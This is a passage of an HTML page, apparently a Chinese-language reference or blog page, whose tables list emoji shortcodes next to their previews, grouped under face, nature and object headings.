align="center">:kissing_heart:</td></tr><tr><td align="center"><code>:kissing_closed_eyes:</code></td><td align="center">:kissing_closed_eyes:</td><td align="center"><code>:flushed:</code></td><td align="center">:flushed:</td><td align="center"><code>:relieved:</code></td><td align="center">:relieved:</td></tr><tr><td align="center"><code>:satisfied:</code></td><td align="center">:satisfied:</td><td align="center"><code>:grin:</code></td><td align="center">:grin:</td><td align="center"><code>:wink:</code></td><td align="center">:wink:</td></tr><tr><td align="center"><code>:stuck_out_tongue_winking_eye:</code></td><td align="center">:stuck_out_tongue_winking_eye:</td><td align="center"><code>:stuck_out_tongue_closed_eyes:</code></td><td align="center">:stuck_out_tongue_closed_eyes:</td><td align="center"><code>:grinning:</code></td><td align="center">:grinning:</td></tr><tr><td align="center"><code>:kissing:</code></td><td align="center">:kissing:</td><td align="center"><code>:kissing_smiling_eyes:</code></td><td align="center">:kissing_smiling_eyes:</td><td align="center"><code>:stuck_out_tongue:</code></td><td align="center">:stuck_out_tongue:</td></tr><tr><td align="center"><code>:sleeping:</code></td><td align="center">:sleeping:</td><td align="center"><code>:worried:</code></td><td align="center">:worried:</td><td align="center"><code>:frowning:</code></td><td align="center">:frowning:</td></tr><tr><td align="center"><code>:anguished:</code></td><td align="center">:anguished:</td><td align="center"><code>:open_mouth:</code></td><td align="center">:open_mouth:</td><td align="center"><code>:grimacing:</code></td><td align="center">:grimacing:</td></tr><tr><td align="center"><code>:confused:</code></td><td align="center">:confused:</td><td align="center"><code>:hushed:</code></td><td align="center">:hushed:</td><td align="center"><code>:expressionless:</code></td><td align="center">:expressionless:</td></tr><tr><td align="center"><code>:unamused:</code></td><td align="center">:unamused:</td><td align="center"><code>:sweat_smile:</code></td><td align="center">:sweat_smile:</td><td align="center"><code>:sweat:</code></td><td align="center">:sweat:</td></tr><tr><td align="center"><code>:disappointed_relieved:</code></td><td align="center">:disappointed_relieved:</td><td align="center"><code>:weary:</code></td><td align="center">:weary:</td><td align="center"><code>:pensive:</code></td><td align="center">:pensive:</td></tr><tr><td align="center"><code>:disappointed:</code></td><td align="center">:disappointed:</td><td align="center"><code>:confounded:</code></td><td align="center">:confounded:</td><td align="center"><code>:fearful:</code></td><td align="center">:fearful:</td></tr><tr><td align="center"><code>:cold_sweat:</code></td><td align="center">:cold_sweat:</td><td align="center"><code>:persevere:</code></td><td align="center">:persevere:</td><td align="center"><code>:cry:</code></td><td align="center">:cry:</td></tr><tr><td align="center"><code>:sob:</code></td><td align="center">:sob:</td><td align="center"><code>:joy:</code></td><td align="center">:joy:</td><td align="center"><code>:astonished:</code></td><td align="center">:astonished:</td></tr><tr><td align="center"><code>:scream:</code></td><td align="center">:scream:</td><td align="center"><code>:neckbeard:</code></td><td align="center">:neckbeard:</td><td align="center"><code>:tired_face:</code></td><td align="center">:tired_face:</td></tr><tr><td align="center"><code>:angry:</code></td><td align="center">:angry:</td><td align="center"><code>:rage:</code></td><td align="center">:rage:</td><td align="center"><code>:triumph:</code></td><td align="center">:triumph:</td></tr><tr><td align="center"><code>:sleepy:</code></td><td align="center">:sleepy:</td><td align="center"><code>:yum:</code></td><td align="center">:yum:</td><td align="center"><code>:mask:</code></td><td align="center">:mask:</td></tr><tr><td align="center"><code>:sunglasses:</code></td><td align="center">:sunglasses:</td><td align="center"><code>:dizzy_face:</code></td><td align="center">:dizzy_face:</td><td align="center"><code>:imp:</code></td><td align="center">:imp:</td></tr><tr><td align="center"><code>:smiling_imp:</code></td><td align="center">:smiling_imp:</td><td align="center"><code>:neutral_face:</code></td><td align="center">:neutral_face:</td><td align="center"><code>:no_mouth:</code></td><td align="center">:no_mouth:</td></tr><tr><td align="center"><code>:innocent:</code></td><td align="center">:innocent:</td><td align="center"><code>:alien:</code></td><td align="center">:alien:</td><td align="center"><code>:yellow_heart:</code></td><td align="center">:yellow_heart:</td></tr><tr><td align="center"><code>:blue_heart:</code></td><td align="center">:blue_heart:</td><td align="center"><code>:purple_heart:</code></td><td align="center">:purple_heart:</td><td align="center"><code>:heart:</code></td><td align="center">:heart:</td></tr><tr><td align="center"><code>:green_heart:</code></td><td align="center">:green_heart:</td><td align="center"><code>:broken_heart:</code></td><td align="center">:broken_heart:</td><td align="center"><code>:heartbeat:</code></td><td align="center">:heartbeat:</td></tr><tr><td align="center"><code>:heartpulse:</code></td><td align="center">:heartpulse:</td><td align="center"><code>:two_hearts:</code></td><td align="center">:two_hearts:</td><td align="center"><code>:revolving_hearts:</code></td><td align="center">:revolving_hearts:</td></tr><tr><td align="center"><code>:cupid:</code></td><td align="center">:cupid:</td><td align="center"><code>:sparkling_heart:</code></td><td align="center">:sparkling_heart:</td><td align="center"><code>:sparkles:</code></td><td align="center">:sparkles:</td></tr><tr><td align="center"><code>:star:</code></td><td align="center">:star:</td><td align="center"><code>:star2:</code></td><td align="center">:star2:</td><td align="center"><code>:dizzy:</code></td><td align="center">:dizzy:</td></tr><tr><td align="center"><code>:boom:</code></td><td align="center">:boom:</td><td align="center"><code>:collision:</code></td><td align="center">:collision:</td><td align="center"><code>:anger:</code></td><td align="center">:anger:</td></tr><tr><td align="center"><code>:exclamation:</code></td><td align="center">:exclamation:</td><td align="center"><code>:question:</code></td><td align="center">:question:</td><td align="center"><code>:grey_exclamation:</code></td><td align="center">:grey_exclamation:</td></tr><tr><td align="center"><code>:grey_question:</code></td><td align="center">:grey_question:</td><td align="center"><code>:zzz:</code></td><td align="center">:zzz:</td><td align="center"><code>:dash:</code></td><td align="center">:dash:</td></tr><tr><td align="center"><code>:sweat_drops:</code></td><td align="center">:sweat_drops:</td><td align="center"><code>:notes:</code></td><td align="center">:notes:</td><td align="center"><code>:musical_note:</code></td><td align="center">:musical_note:</td></tr><tr><td align="center"><code>:fire:</code></td><td align="center">:fire:</td><td align="center"><code>:hankey:</code></td><td align="center">:hankey:</td><td align="center"><code>:poop:</code></td><td align="center">:poop:</td></tr><tr><td align="center"><code>::</code></td><td align="center">:shit:</td><td align="center"><code>:+1:</code></td><td align="center">:+1:</td><td align="center"><code>:thumbsup:</code></td><td align="center">:thumbsup:</td></tr><tr><td align="center"><code>:-1:</code></td><td align="center">:-1:</td><td align="center"><code>:thumbsdown:</code></td><td align="center">:thumbsdown:</td><td align="center"><code>:ok_hand:</code></td><td align="center">:ok_hand:</td></tr><tr><td align="center"><code>:punch:</code></td><td align="center">:punch:</td><td align="center"><code>:facepunch:</code></td><td align="center">:facepunch:</td><td align="center"><code>:fist:</code></td><td align="center">:fist:</td></tr><tr><td align="center"><code>:v:</code></td><td align="center">:v:</td><td align="center"><code>:wave:</code></td><td align="center">:wave:</td><td align="center"><code>:hand:</code></td><td align="center">:hand:</td></tr><tr><td align="center"><code>:raised_hand:</code></td><td align="center">:raised_hand:</td><td align="center"><code>:open_hands:</code></td><td align="center">:open_hands:</td><td align="center"><code>:point_up:</code></td><td align="center">:point_up:</td></tr><tr><td align="center"><code>:point_down:</code></td><td align="center">:point_down:</td><td align="center"><code>:point_left:</code></td><td align="center">:point_left:</td><td align="center"><code>:point_right:</code></td><td align="center">:point_right:</td></tr><tr><td align="center"><code>:raised_hands:</code></td><td align="center">:raised_hands:</td><td align="center"><code>:pray:</code></td><td align="center">:pray:</td><td align="center"><code>:point_up_2:</code></td><td align="center">:point_up_2:</td></tr><tr><td align="center"><code>:clap:</code></td><td align="center">:clap:</td><td align="center"><code>:muscle:</code></td><td align="center">:muscle:</td><td align="center"><code>:metal:</code></td><td align="center">:metal:</td></tr><tr><td align="center"><code>:fu:</code></td><td align="center">:fu:</td><td align="center"><code>:walking:</code></td><td align="center">:walking:</td><td align="center"><code>:runner:</code></td><td align="center">:runner:</td></tr><tr><td align="center"><code>:running:</code></td><td align="center">:running:</td><td align="center"><code>:couple:</code></td><td align="center">:couple:</td><td align="center"><code>:family:</code></td><td align="center">:family:</td></tr><tr><td align="center"><code>:two_men_holding_hands:</code></td><td align="center">:two_men_holding_hands:</td><td align="center"><code>:two_women_holding_hands:</code></td><td align="center">:two_women_holding_hands:</td><td align="center"><code>:dancer:</code></td><td align="center">:dancer:</td></tr><tr><td align="center"><code>:dancers:</code></td><td align="center">:dancers:</td><td align="center"><code>:ok_woman:</code></td><td align="center">:ok_woman:</td><td align="center"><code>:no_good:</code></td><td align="center">:no_good:</td></tr><tr><td align="center"><code>:information_desk_person:</code></td><td align="center">:information_desk_person:</td><td align="center"><code>:raising_hand:</code></td><td align="center">:raising_hand:</td><td align="center"><code>:bride_with_veil:</code></td><td align="center">:bride_with_veil:</td></tr><tr><td align="center"><code>:person_with_pouting_face:</code></td><td align="center">:person_with_pouting_face:</td><td align="center"><code>:person_frowning:</code></td><td align="center">:person_frowning:</td><td align="center"><code>:bow:</code></td><td align="center">:bow:</td></tr><tr><td align="center"><code>:couplekiss:</code></td><td align="center">:couplekiss:</td><td align="center"><code>:couple_with_heart:</code></td><td align="center">:couple_with_heart:</td><td align="center"><code>:massage:</code></td><td align="center">:massage:</td></tr><tr><td align="center"><code>:haircut:</code></td><td align="center">:haircut:</td><td align="center"><code>:nail_care:</code></td><td align="center">:nail_care:</td><td align="center"><code>:boy:</code></td><td align="center">:boy:</td></tr><tr><td align="center"><code>:girl:</code></td><td align="center">:girl:</td><td align="center"><code>:woman:</code></td><td align="center">:woman:</td><td align="center"><code>:man:</code></td><td align="center">:man:</td></tr><tr><td align="center"><code>:baby:</code></td><td align="center">:baby:</td><td align="center"><code>:older_woman:</code></td><td align="center">:older_woman:</td><td align="center"><code>:older_man:</code></td><td align="center">:older_man:</td></tr><tr><td align="center"><code>:person_with_blond_hair:</code></td><td align="center">:person_with_blond_hair:</td><td align="center"><code>:man_with_gua_pi_mao:</code></td><td align="center">:man_with_gua_pi_mao:</td><td align="center"><code>:man_with_turban:</code></td><td align="center">:man_with_turban:</td></tr><tr><td align="center"><code>:construction_worker:</code></td><td align="center">:construction_worker:</td><td align="center"><code>:cop:</code></td><td align="center">:cop:</td><td align="center"><code>:angel:</code></td><td align="center">:angel:</td></tr><tr><td align="center"><code>:princess:</code></td><td align="center">:princess:</td><td align="center"><code>:smiley_cat:</code></td><td align="center">:smiley_cat:</td><td align="center"><code>:smile_cat:</code></td><td align="center">:smile_cat:</td></tr><tr><td align="center"><code>:heart_eyes_cat:</code></td><td align="center">:heart_eyes_cat:</td><td align="center"><code>:kissing_cat:</code></td><td align="center">:kissing_cat:</td><td align="center"><code>:smirk_cat:</code></td><td align="center">:smirk_cat:</td></tr><tr><td align="center"><code>:scream_cat:</code></td><td align="center">:scream_cat:</td><td align="center"><code>:crying_cat_face:</code></td><td align="center">:crying_cat_face:</td><td align="center"><code>:joy_cat:</code></td><td align="center">:joy_cat:</td></tr><tr><td align="center"><code>:pouting_cat:</code></td><td align="center">:pouting_cat:</td><td align="center"><code>:japanese_ogre:</code></td><td align="center">:japanese_ogre:</td><td align="center"><code>:japanese_goblin:</code></td><td align="center">:japanese_goblin:</td></tr><tr><td align="center"><code>:see_no_evil:</code></td><td align="center">:see_no_evil:</td><td align="center"><code>:hear_no_evil:</code></td><td align="center">:hear_no_evil:</td><td align="center"><code>:speak_no_evil:</code></td><td align="center">:speak_no_evil:</td></tr><tr><td align="center"><code>:guardsman:</code></td><td align="center">:guardsman:</td><td align="center"><code>:skull:</code></td><td align="center">:skull:</td><td align="center"><code>:feet:</code></td><td align="center">:feet:</td></tr><tr><td align="center"><code>:lips:</code></td><td align="center">:lips:</td><td align="center"><code>:kiss:</code></td><td align="center">:kiss:</td><td align="center"><code>:droplet:</code></td><td align="center">:droplet:</td></tr><tr><td align="center"><code>:ear:</code></td><td align="center">:ear:</td><td align="center"><code>:eyes:</code></td><td align="center">:eyes:</td><td align="center"><code>:nose:</code></td><td align="center">:nose:</td></tr><tr><td align="center"><code>:tongue:</code></td><td align="center">:tongue:</td><td align="center"><code>:love_letter:</code></td><td align="center">:love_letter:</td><td align="center"><code>:bust_in_silhouette:</code></td><td align="center">:bust_in_silhouette:</td></tr><tr><td align="center"><code>:busts_in_silhouette:</code></td><td align="center">:busts_in_silhouette:</td><td align="center"><code>:speech_balloon:</code></td><td align="center">:speech_balloon:</td><td align="center"><code>:thought_balloon:</code></td><td align="center">:thought_balloon:</td></tr><tr><td align="center"><code>:feelsgood:</code></td><td align="center">:feelsgood:</td><td align="center"><code>:finnadie:</code></td><td align="center">:finnadie:</td><td align="center"><code>:goberserk:</code></td><td align="center">:goberserk:</td></tr><tr><td align="center"><code>:godmode:</code></td><td align="center">:godmode:</td><td align="center"><code>:hurtrealbad:</code></td><td align="center">:hurtrealbad:</td><td align="center"><code>:rage1:</code></td><td align="center">:rage1:</td></tr><tr><td align="center"><code>:rage2:</code></td><td align="center">:rage2:</td><td align="center"><code>:rage3:</code></td><td align="center">:rage3:</td><td align="center"><code>:rage4:</code></td><td align="center">:rage4:</td></tr><tr><td align="center"><code>:suspect:</code></td><td align="center">:suspect:</td><td align="center"><code>:trollface:</code></td><td align="center">:trollface:</td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="自然"><a href="#自然" class="headerlink" title="自然"></a>自然</h2><table><thead><tr><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th></tr></thead><tbody><tr><td align="center"><code>:sunny:</code></td><td align="center">:sunny:</td><td align="center"><code>:umbrella:</code></td><td align="center">:umbrella:</td><td align="center"><code>:cloud:</code></td><td align="center">:cloud:</td></tr><tr><td align="center"><code>:snowflake:</code></td><td align="center">:snowflake:</td><td align="center"><code>:snowman:</code></td><td align="center">:snowman:</td><td align="center"><code>:zap:</code></td><td align="center">:zap:</td></tr><tr><td align="center"><code>:cyclone:</code></td><td align="center">:cyclone:</td><td align="center"><code>:foggy:</code></td><td align="center">:foggy:</td><td align="center"><code>:ocean:</code></td><td align="center">:ocean:</td></tr><tr><td align="center"><code>:cat:</code></td><td align="center">:cat:</td><td align="center"><code>:dog:</code></td><td align="center">:dog:</td><td align="center"><code>:mouse:</code></td><td align="center">:mouse:</td></tr><tr><td align="center"><code>:hamster:</code></td><td align="center">:hamster:</td><td align="center"><code>:rabbit:</code></td><td align="center">:rabbit:</td><td align="center"><code>:wolf:</code></td><td align="center">:wolf:</td></tr><tr><td align="center"><code>:frog:</code></td><td align="center">:frog:</td><td align="center"><code>:tiger:</code></td><td align="center">:tiger:</td><td align="center"><code>:koala:</code></td><td align="center">:koala:</td></tr><tr><td align="center"><code>:bear:</code></td><td align="center">:bear:</td><td align="center"><code>:pig:</code></td><td align="center">:pig:</td><td align="center"><code>:pig_nose:</code></td><td align="center">:pig_nose:</td></tr><tr><td align="center"><code>:cow:</code></td><td align="center">:cow:</td><td align="center"><code>:boar:</code></td><td align="center">:boar:</td><td align="center"><code>:monkey_face:</code></td><td align="center">:monkey_face:</td></tr><tr><td align="center"><code>:monkey:</code></td><td align="center">:monkey:</td><td align="center"><code>:horse:</code></td><td align="center">:horse:</td><td align="center"><code>:racehorse:</code></td><td align="center">:racehorse:</td></tr><tr><td align="center"><code>:camel:</code></td><td align="center">:camel:</td><td align="center"><code>:sheep:</code></td><td align="center">:sheep:</td><td align="center"><code>:elephant:</code></td><td align="center">:elephant:</td></tr><tr><td align="center"><code>:panda_face:</code></td><td align="center">:panda_face:</td><td align="center"><code>:snake:</code></td><td align="center">:snake:</td><td align="center"><code>:bird:</code></td><td align="center">:bird:</td></tr><tr><td align="center"><code>:baby_chick:</code></td><td align="center">:baby_chick:</td><td align="center"><code>:hatched_chick:</code></td><td align="center">:hatched_chick:</td><td align="center"><code>:hatching_chick:</code></td><td align="center">:hatching_chick:</td></tr><tr><td align="center"><code>:chicken:</code></td><td align="center">:chicken:</td><td align="center"><code>:penguin:</code></td><td align="center">:penguin:</td><td align="center"><code>:turtle:</code></td><td align="center">:turtle:</td></tr><tr><td align="center"><code>:bug:</code></td><td align="center">:bug:</td><td align="center"><code>:honeybee:</code></td><td align="center">:honeybee:</td><td align="center"><code>:ant:</code></td><td align="center">:ant:</td></tr><tr><td align="center"><code>:beetle:</code></td><td align="center">:beetle:</td><td align="center"><code>:snail:</code></td><td align="center">:snail:</td><td align="center"><code>:octopus:</code></td><td align="center">:octopus:</td></tr><tr><td align="center"><code>:tropical_fish:</code></td><td align="center">:tropical_fish:</td><td align="center"><code>:fish:</code></td><td align="center">:fish:</td><td align="center"><code>:whale:</code></td><td align="center">:whale:</td></tr><tr><td align="center"><code>:whale2:</code></td><td align="center">:whale2:</td><td align="center"><code>:dolphin:</code></td><td align="center">:dolphin:</td><td align="center"><code>:cow2:</code></td><td align="center">:cow2:</td></tr><tr><td align="center"><code>:ram:</code></td><td align="center">:ram:</td><td align="center"><code>:rat:</code></td><td align="center">:rat:</td><td align="center"><code>:water_buffalo:</code></td><td align="center">:water_buffalo:</td></tr><tr><td align="center"><code>:tiger2:</code></td><td align="center">:tiger2:</td><td align="center"><code>:rabbit2:</code></td><td align="center">:rabbit2:</td><td align="center"><code>:dragon:</code></td><td align="center">:dragon:</td></tr><tr><td align="center"><code>:goat:</code></td><td align="center">:goat:</td><td align="center"><code>:rooster:</code></td><td align="center">:rooster:</td><td align="center"><code>:dog2:</code></td><td align="center">:dog2:</td></tr><tr><td align="center"><code>:pig2:</code></td><td align="center">:pig2:</td><td align="center"><code>:mouse2:</code></td><td align="center">:mouse2:</td><td align="center"><code>:ox:</code></td><td align="center">:ox:</td></tr><tr><td align="center"><code>:dragon_face:</code></td><td align="center">:dragon_face:</td><td align="center"><code>:blowfish:</code></td><td align="center">:blowfish:</td><td align="center"><code>:crocodile:</code></td><td align="center">:crocodile:</td></tr><tr><td align="center"><code>:dromedary_camel:</code></td><td align="center">:dromedary_camel:</td><td align="center"><code>:leopard:</code></td><td align="center">:leopard:</td><td align="center"><code>:cat2:</code></td><td align="center">:cat2:</td></tr><tr><td align="center"><code>:poodle:</code></td><td align="center">:poodle:</td><td align="center"><code>:paw_prints:</code></td><td align="center">:paw_prints:</td><td align="center"><code>:bouquet:</code></td><td align="center">:bouquet:</td></tr><tr><td align="center"><code>:cherry_blossom:</code></td><td align="center">:cherry_blossom:</td><td align="center"><code>:tulip:</code></td><td align="center">:tulip:</td><td align="center"><code>:four_leaf_clover:</code></td><td align="center">:four_leaf_clover:</td></tr><tr><td align="center"><code>:rose:</code></td><td align="center">:rose:</td><td align="center"><code>:sunflower:</code></td><td align="center">:sunflower:</td><td align="center"><code>:hibiscus:</code></td><td align="center">:hibiscus:</td></tr><tr><td align="center"><code>:maple_leaf:</code></td><td align="center">:maple_leaf:</td><td align="center"><code>:leaves:</code></td><td align="center">:leaves:</td><td align="center"><code>:fallen_leaf:</code></td><td align="center">:fallen_leaf:</td></tr><tr><td align="center"><code>:herb:</code></td><td align="center">:herb:</td><td align="center"><code>:mushroom:</code></td><td align="center">:mushroom:</td><td align="center"><code>:cactus:</code></td><td align="center">:cactus:</td></tr><tr><td align="center"><code>:palm_tree:</code></td><td align="center">:palm_tree:</td><td align="center"><code>:evergreen_tree:</code></td><td align="center">:evergreen_tree:</td><td align="center"><code>:deciduous_tree:</code></td><td align="center">:deciduous_tree:</td></tr><tr><td align="center"><code>:chestnut:</code></td><td align="center">:chestnut:</td><td align="center"><code>:seedling:</code></td><td align="center">:seedling:</td><td align="center"><code>:blossom:</code></td><td align="center">:blossom:</td></tr><tr><td align="center"><code>:ear_of_rice:</code></td><td align="center">:ear_of_rice:</td><td align="center"><code>:shell:</code></td><td align="center">:shell:</td><td align="center"><code>:globe_with_meridians:</code></td><td align="center">:globe_with_meridians:</td></tr><tr><td align="center"><code>:sun_with_face:</code></td><td align="center">:sun_with_face:</td><td align="center"><code>:full_moon_with_face:</code></td><td align="center">:full_moon_with_face:</td><td align="center"><code>:new_moon_with_face:</code></td><td align="center">:new_moon_with_face:</td></tr><tr><td align="center"><code>:new_moon:</code></td><td align="center">:new_moon:</td><td align="center"><code>:waxing_crescent_moon:</code></td><td align="center">:waxing_crescent_moon:</td><td align="center"><code>:first_quarter_moon:</code></td><td align="center">:first_quarter_moon:</td></tr><tr><td align="center"><code>:full_moon:</code></td><td align="center">:full_moon:</td><td align="center"><code>:waning_gibbous_moon:</code></td><td align="center">:waning_gibbous_moon:</td><td align="center"><code>:last_quarter_moon:</code></td><td align="center">:last_quarter_moon:</td></tr><tr><td align="center"><code>:waning_crescent_moon:</code></td><td align="center">:waning_crescent_moon:</td><td align="center"><code>:last_quarter_moon_with_face:</code></td><td align="center">:last_quarter_moon_with_face:</td><td align="center"><code>:first_quarter_moon_with_face:</code></td><td align="center">:first_quarter_moon_with_face:</td></tr><tr><td align="center"><code>:moon:</code></td><td align="center">:moon:</td><td align="center"><code>:earth_africa:</code></td><td align="center">:earth_africa:</td><td align="center"><code>:earth_americas:</code></td><td align="center">:earth_americas:</td></tr><tr><td align="center"><code>:earth_asia:</code></td><td align="center">:earth_asia:</td><td align="center"><code>:volcano:</code></td><td align="center">:volcano:</td><td align="center"><code>:milky_way:</code></td><td align="center">:milky_way:</td></tr><tr><td align="center"><code>:partly_sunny:</code></td><td align="center">:partly_sunny:</td><td align="center"><code>:octocat:</code></td><td align="center">:octocat:</td><td align="center"><code>:squirrel:</code></td><td align="center">:squirrel:</td></tr><tr><td align="center"><code>:waxing_gibbous_moon:</code></td><td align="center">:waxing_gibbous_moon:</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="物体"><a href="#物体" class="headerlink" title="物体"></a>物体</h2><table><thead><tr><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th></tr></thead><tbody><tr><td align="center"><code>:bamboo:</code></td><td align="center">:bamboo:</td><td align="center"><code>:gift_heart:</code></td><td align="center">:gift_heart:</td><td align="center"><code>:dolls:</code></td><td align="center">:dolls:</td></tr><tr><td align="center"><code>:school_satchel:</code></td><td align="center">:school_satchel:</td><td align="center"><code>:mortar_board:</code></td><td align="center">:mortar_board:</td><td align="center"><code>:flags:</code></td><td align="center">:flags:</td></tr><tr><td align="center"><code>:fireworks:</code></td><td align="center">:fireworks:</td><td align="center"><code>:sparkler:</code></td><td align="center">:sparkler:</td><td align="center"><code>:wind_chime:</code></td><td align="center">:wind_chime:</td></tr><tr><td align="center"><code>:rice_scene:</code></td><td align="center">:rice_scene:</td><td align="center"><code>:jack_o_lantern:</code></td><td align="center">:jack_o_lantern:</td><td align="center"><code>:ghost:</code></td><td align="center">:ghost:</td></tr><tr><td align="center"><code>:santa:</code></td><td align="center">:santa:</td><td align="center"><code>:christmas_tree:</code></td><td align="center">:christmas_tree:</td><td align="center"><code>:gift:</code></td><td align="center">:gift:</td></tr><tr><td align="center"><code>:bell:</code></td><td align="center">:bell:</td><td align="center"><code>:no_bell:</code></td><td align="center">:no_bell:</td><td align="center"><code>:tanabata_tree:</code></td><td align="center">:tanabata_tree:</td></tr><tr><td align="center"><code>:tada:</code></td><td align="center">:tada:</td><td align="center"><code>:confetti_ball:</code></td><td align="center">:confetti_ball:</td><td align="center"><code>:balloon:</code></td><td align="center">:balloon:</td></tr><tr><td align="center"><code>:crystal_ball:</code></td><td align="center">:crystal_ball:</td><td align="center"><code>:cd:</code></td><td align="center">:cd:</td><td align="center"><code>:dvd:</code></td><td align="center">:dvd:</td></tr><tr><td align="center"><code>:floppy_disk:</code></td><td align="center">:floppy_disk:</td><td align="center"><code>:camera:</code></td><td align="center">:camera:</td><td align="center"><code>:video_camera:</code></td><td align="center">:video_camera:</td></tr><tr><td align="center"><code>:movie_camera:</code></td><td align="center">:movie_camera:</td><td align="center"><code>:computer:</code></td><td align="center">:computer:</td><td align="center"><code>:tv:</code></td><td align="center">:tv:</td></tr><tr><td align="center"><code>:iphone:</code></td><td align="center">:iphone:</td><td align="center"><code>:phone:</code></td><td align="center">:phone:</td><td align="center"><code>:telephone:</code></td><td align="center">:telephone:</td></tr><tr><td align="center"><code>:telephone_receiver:</code></td><td align="center">:telephone_receiver:</td><td align="center"><code>:pager:</code></td><td align="center">:pager:</td><td align="center"><code>:fax:</code></td><td align="center">:fax:</td></tr><tr><td align="center"><code>:minidisc:</code></td><td align="center">:minidisc:</td><td align="center"><code>:vhs:</code></td><td align="center">:vhs:</td><td align="center"><code>:sound:</code></td><td align="center">:sound:</td></tr><tr><td align="center"><code>:speaker:</code></td><td align="center">:speaker:</td><td align="center"><code>:mute:</code></td><td align="center">:mute:</td><td align="center"><code>:loudspeaker:</code></td><td align="center">:loudspeaker:</td></tr><tr><td align="center"><code>:mega:</code></td><td align="center">:mega:</td><td align="center"><code>:hourglass:</code></td><td align="center">:hourglass:</td><td align="center"><code>:hourglass_flowing_sand:</code></td><td align="center">:hourglass_flowing_sand:</td></tr><tr><td align="center"><code>:alarm_clock:</code></td><td align="center">:alarm_clock:</td><td align="center"><code>:watch:</code></td><td align="center">:watch:</td><td align="center"><code>:radio:</code></td><td align="center">:radio:</td></tr><tr><td align="center"><code>:satellite:</code></td><td align="center">:satellite:</td><td align="center"><code>:loop:</code></td><td align="center">:loop:</td><td align="center"><code>:mag:</code></td><td align="center">:mag:</td></tr><tr><td align="center"><code>:mag_right:</code></td><td align="center">:mag_right:</td><td align="center"><code>:unlock:</code></td><td align="center">:unlock:</td><td align="center"><code>:lock:</code></td><td align="center">:lock:</td></tr><tr><td align="center"><code>:lock_with_ink_pen:</code></td><td align="center">:lock_with_ink_pen:</td><td align="center"><code>:closed_lock_with_key:</code></td><td align="center">:closed_lock_with_key:</td><td align="center"><code>:key:</code></td><td align="center">:key:</td></tr><tr><td align="center"><code>:bulb:</code></td><td align="center">:bulb:</td><td align="center"><code>:flashlight:</code></td><td align="center">:flashlight:</td><td align="center"><code>:high_brightness:</code></td><td align="center">:high_brightness:</td></tr><tr><td align="center"><code>:low_brightness:</code></td><td align="center">:low_brightness:</td><td align="center"><code>:electric_plug:</code></td><td align="center">:electric_plug:</td><td align="center"><code>:battery:</code></td><td align="center">:battery:</td></tr><tr><td align="center"><code>:calling:</code></td><td align="center">:calling:</td><td align="center"><code>:email:</code></td><td align="center">:email:</td><td align="center"><code>:mailbox:</code></td><td align="center">:mailbox:</td></tr><tr><td align="center"><code>:postbox:</code></td><td align="center">:postbox:</td><td align="center"><code>:bath:</code></td><td align="center">:bath:</td><td align="center"><code>:bathtub:</code></td><td align="center">:bathtub:</td></tr><tr><td align="center"><code>:shower:</code></td><td align="center">:shower:</td><td align="center"><code>:toilet:</code></td><td align="center">:toilet:</td><td align="center"><code>:wrench:</code></td><td align="center">:wrench:</td></tr><tr><td align="center"><code>:nut_and_bolt:</code></td><td align="center">:nut_and_bolt:</td><td align="center"><code>:hammer:</code></td><td align="center">:hammer:</td><td align="center"><code>:seat:</code></td><td align="center">:seat:</td></tr><tr><td align="center"><code>:moneybag:</code></td><td align="center">:moneybag:</td><td align="center"><code>:yen:</code></td><td align="center">:yen:</td><td align="center"><code>:dollar:</code></td><td align="center">:dollar:</td></tr><tr><td align="center"><code>:pound:</code></td><td align="center">:pound:</td><td align="center"><code>:euro:</code></td><td align="center">:euro:</td><td align="center"><code>:credit_card:</code></td><td align="center">:credit_card:</td></tr><tr><td align="center"><code>:money_with_wings:</code></td><td align="center">:money_with_wings:</td><td align="center"><code>:e-mail:</code></td><td align="center">:e-mail:</td><td align="center"><code>:inbox_tray:</code></td><td align="center">:inbox_tray:</td></tr><tr><td align="center"><code>:outbox_tray:</code></td><td align="center">:outbox_tray:</td><td align="center"><code>:envelope:</code></td><td align="center">:envelope:</td><td align="center"><code>:incoming_envelope:</code></td><td align="center">:incoming_envelope:</td></tr><tr><td align="center"><code>:postal_horn:</code></td><td align="center">:postal_horn:</td><td align="center"><code>:mailbox_closed:</code></td><td align="center">:mailbox_closed:</td><td align="center"><code>:mailbox_with_mail:</code></td><td align="center">:mailbox_with_mail:</td></tr><tr><td align="center"><code>:mailbox_with_no_mail:</code></td><td align="center">:mailbox_with_no_mail:</td><td align="center"><code>:door:</code></td><td align="center">:door:</td><td align="center"><code>:smoking:</code></td><td align="center">:smoking:</td></tr><tr><td align="center"><code>:bomb:</code></td><td align="center">:bomb:</td><td align="center"><code>:gun:</code></td><td align="center">:gun:</td><td align="center"><code>:hocho:</code></td><td align="center">:hocho:</td></tr><tr><td align="center"><code>:pill:</code></td><td align="center">:pill:</td><td align="center"><code>:syringe:</code></td><td align="center">:syringe:</td><td align="center"><code>:page_facing_up:</code></td><td align="center">:page_facing_up:</td></tr><tr><td align="center"><code>:page_with_curl:</code></td><td align="center">:page_with_curl:</td><td align="center"><code>:bookmark_tabs:</code></td><td align="center">:bookmark_tabs:</td><td align="center"><code>:bar_chart:</code></td><td align="center">:bar_chart:</td></tr><tr><td align="center"><code>:chart_with_upwards_trend:</code></td><td align="center">:chart_with_upwards_trend:</td><td align="center"><code>:chart_with_downwards_trend:</code></td><td align="center">:chart_with_downwards_trend:</td><td align="center"><code>:scroll:</code></td><td align="center">:scroll:</td></tr><tr><td align="center"><code>:clipboard:</code></td><td align="center">:clipboard:</td><td align="center"><code>:calendar:</code></td><td align="center">:calendar:</td><td align="center"><code>:date:</code></td><td align="center">:date:</td></tr><tr><td align="center"><code>:card_index:</code></td><td align="center">:card_index:</td><td align="center"><code>:file_folder:</code></td><td align="center">:file_folder:</td><td align="center"><code>:open_file_folder:</code></td><td align="center">:open_file_folder:</td></tr><tr><td align="center"><code>:scissors:</code></td><td align="center">:scissors:</td><td align="center"><code>:pushpin:</code></td><td align="center">:pushpin:</td><td align="center"><code>:paperclip:</code></td><td align="center">:paperclip:</td></tr><tr><td align="center"><code>:black_nib:</code></td><td align="center">:black_nib:</td><td align="center"><code>:pencil2:</code></td><td align="center">:pencil2:</td><td align="center"><code>:straight_ruler:</code></td><td 